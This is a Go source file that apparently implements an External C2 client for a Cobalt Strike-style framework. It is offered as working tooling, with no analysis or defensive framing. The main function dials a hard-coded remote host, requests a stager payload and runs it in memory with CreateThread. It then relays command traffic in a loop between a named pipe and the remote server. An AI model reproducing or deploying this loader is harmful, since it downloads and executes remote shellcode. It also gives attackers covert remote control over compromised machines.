package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"runtime"
	"time"

	"./invokedll"
	. "github.com/microsoft/go-winio"
)

var pipeName = `foobar`
var isDebug = true

type SocketChannel struct {
	Socket net.Conn
	Debug  bool
}
type PipeChannel struct {
	Pipe  net.Conn
	Debug bool
}

func (s *SocketChannel) ReadFrame() ([]byte, int, error) {
	sizeBytes := make([]byte, 4)
	if _, err := s.Socket.Read(sizeBytes); err != nil {
		return nil, 0, err
	}
	size := binary.LittleEndian.Uint32(sizeBytes)
	if size > 1024*1024 {
		size = 1024 * 1024
	}
	var total uint32
	buff := make([]byte, size)
	for total < size {
		read, err := s.Socket.Read(buff[total:])
		if err != nil {
			return nil, int(total), err
		}
		total += uint32(read)
	}
	if (size > 1 && size < 1024) && s.Debug {
		log.Printf("[+] Read frame: %s\n", base64.StdEncoding.EncodeToString(buff))
	}
	return buff, int(total), nil
}

func (s *SocketChannel) SendFrame(buffer []byte) (int, error) {
	length := len(buffer)
	if (length > 2 && length < 1024) && s.Debug {
		log.Printf("[+] Sending frame: %s\n", base64.StdEncoding.EncodeToString(buffer))
	}
	sizeBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(sizeBytes, uint32(length))
	if _, err := s.Socket.Write(sizeBytes); err != nil {
		return 0, err
	}
	x, err := s.Socket.Write(buffer)
	return x + 4, err
}

func (s *SocketChannel) getStager() []byte {
	taskWaitTime := 100
	osVersion := "arch=x86"
	if runtime.GOARCH == "amd64" {
		osVersion = "arch=x64"
	}

	if s.Debug {
		log.Println("Stager information:")
		log.Println(osVersion)
		log.Println("pipename=" + pipeName)
		log.Println(fmt.Sprintf("block=%d", taskWaitTime))
	}

	s.SendFrame([]byte(osVersion))
	s.SendFrame([]byte("pipename=" + pipeName))
	s.SendFrame([]byte(fmt.Sprintf("block=%d", taskWaitTime)))
	s.SendFrame([]byte("go"))
	stager, _, err := s.ReadFrame()
	if err != nil {
		println(err.Error())
		return nil
	}
	return stager
}

func (c *PipeChannel) ReadPipe() ([]byte, int, error) {
	sizeBytes := make([]byte, 4)
	if _, err := c.Pipe.Read(sizeBytes); err != nil {
		return nil, 0, err
	}
	size := binary.LittleEndian.Uint32(sizeBytes)
	if size > 1024*1024 {
		size = 1024 * 1024
	}
	var total uint32
	buff := make([]byte, size)
	for total < size {
		read, err := c.Pipe.Read(buff[total:])
		if err != nil {
			return nil, int(total), err
		}
		total += uint32(read)
	}
	if size > 1 && size < 1024 && c.Debug {
		log.Printf("[+] Read pipe data: %s\n", base64.StdEncoding.EncodeToString(buff))
	}
	return buff, int(total), nil
}

func (c *PipeChannel) WritePipe(buffer []byte) (int, error) {
	length := len(buffer)
	if length > 2 && length < 1024 && c.Debug {
		log.Printf("[+] Sending pipe data: %s\n", base64.StdEncoding.EncodeToString(buffer))
	}
	sizeBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(sizeBytes, uint32(length))
	if _, err := c.Pipe.Write(sizeBytes); err != nil {
		return 0, err
	}
	x, err := c.Pipe.Write(buffer)
	return x + 4, err
}

func main() {
	conn, err := net.Dial("tcp", "8.8.8.8:2222")
	if err != nil {
		println(err.Error())
		return
	}
	a := &SocketChannel{conn, isDebug}

	stager := a.getStager()
	if stager == nil {
		println("Error: getStager Failed. ")
		return
	}

	invokedll.CreateThread(stager)

	// Wait for namedpipe open
	time.Sleep(3e9)
	client, err := DialPipe(`\\.\pipe\`+pipeName, nil)
	if err != nil {
		log.Printf(err.Error())
		return
	}
	defer client.Close()
	pipe := &PipeChannel{client, isDebug}

	for {
		//sleep time
		time.Sleep(1e9)
		n, _, err := pipe.ReadPipe()
		if err != nil {
			log.Printf(err.Error())
		}

		a.SendFrame(n)
		z, _, err := a.ReadFrame()
		if err != nil {
			log.Printf(err.Error())
		}
		pipe.WritePipe(z)
	}
}
